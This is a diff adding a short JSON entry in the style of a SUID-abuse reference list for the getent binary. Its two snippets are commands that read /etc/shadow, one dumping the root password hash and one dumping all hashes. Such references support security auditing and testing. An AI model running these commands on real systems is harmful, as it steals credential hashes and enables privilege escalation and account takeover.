@@ -1,0 +1,14 @@
+{
+  "functions": {
+    "suid": [
+      {
+        "description": "",
+        "code": "# Leak root hash from /etc/shadow via getent SUID binary\n./getent shadow root\n"
+      },
+      {
+        "description": "",
+        "code": "# Dump all hashes\n./getent shadow\n"
+      }
+    ]
+  }
+}
